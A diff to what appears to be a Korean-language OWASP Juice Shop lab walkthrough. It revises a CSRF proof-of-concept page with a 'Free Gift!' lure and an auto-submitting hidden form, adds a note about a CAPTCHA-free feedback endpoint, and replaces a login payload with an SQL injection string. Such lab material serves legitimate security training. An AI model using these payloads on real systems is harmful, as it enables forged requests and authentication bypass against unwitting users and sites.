@@ -514,17 +514,25 @@ Content-Type: application/json
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Free Gift!</h1>
-  <form id="csrf-form" action="http://localhost:3000/api/feedbacks" method="POST">
-    <input type="hidden" name="comment" value="Hacked!">
-    <input type="hidden" name="rating" value="1">
-  </form>
-  <script>
-    document.getElementById('csrf-form').submit();
-  </script>
+<h1>Free Gift!</h1>
+<form id="csrf-form" action="http://127.0.0.1:3000/api/Feedbacks/" method="PUT">
+<input type="hidden" name="comment" value="Hacked!">
+<input type="hidden" name="rating" value="2">
+</form>
+<script>
+document.getElementById('csrf-form').submit();
+</script>
 </body>
 </html>
 ```
+CAPTCHA를 완전히 생략할 수 있는 legacy 엔드포인트 이용
+
+Juice Shop에는 다음과 같은 숨겨진 엔드포인트가 있음:
+
+POST /api/Feedbacks
+
+
+대문자 F 버전은 CAPTCHA 검사 없음.
 
 **4단계: 공격 시뮬레이션**
 - HTML 파일을 저장하고 열기
@@ -679,8 +687,8 @@ fetch('/rest/user/login', {
 **대체 페이로드:**
 ```javascript
 {
-  email: {"$gt": ""},     // email > ""
-  password: {"$gt": ""}   // password > ""
+  "email": "' or '1'='1' --",
+  "password": "doesntmatter"
 }
 ```
 
